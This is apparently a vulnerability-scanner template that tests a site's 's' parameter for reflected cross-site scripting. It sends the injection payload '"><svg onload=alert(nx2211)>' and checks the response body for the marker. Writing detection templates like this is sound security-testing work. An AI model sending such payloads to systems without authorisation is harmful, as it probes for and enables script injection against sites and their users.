id: xss2-212
name: 'Reflected XSS2 ctx-1 via s'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in s'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      s:
        - '"><svg onload=alert(nx2211)>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2211'
